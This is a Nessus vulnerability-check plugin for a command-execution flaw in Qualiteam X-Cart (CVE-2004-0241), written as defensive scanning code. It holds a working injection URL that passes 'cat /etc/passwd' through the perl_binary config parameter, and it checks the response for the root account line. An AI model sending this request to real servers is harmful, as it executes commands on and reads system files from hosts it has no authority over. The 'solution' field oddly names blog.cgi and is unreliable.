#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(12040);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2004-0241");
 script_bugtraq_id(9560);
 script_osvdb_id(3808, 3809);
 
 script_name(english:"Qualiteam X-Cart Multiple Script perl_binary Parameter Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary commands can be run on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Qualiteam X-Cart - a shopping cart software 
written in PHP.

There is a bug in this software that could allow an attacker to execute
arbitrary commands on the remote web server with the privileges of the
web user.  In addition to this, there are some flaws that could allow
an attacker to obtain more information about the remote server, like
the physical location of the remote web root." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of blog.cgi or disable this software." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/02/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/02/03");
 script_cvs_date("$Date: 2016/05/11 13:40:21 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks Qualiteam X-Cart");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("webmirror.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

foreach dir (cgi_dirs())
{
 u = string(dir,"/admin/general.php?mode=perlinfo&config[General][perl_binary]=cat%20/etc/passwd||");
 r = http_send_recv3(method: "GET", item: u, port:port);
 if (isnull(r)) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string: r[0]+r[1]+r[2]))
 {
   if (report_verbosity < 1)
     security_hole(port);
   else
     security_hole(port, extra:
strcat('\nThe following URL exhibits the flaw :\n\n', build_url(port: port, qs: u), '\n'));
   exit(0);
 }
}
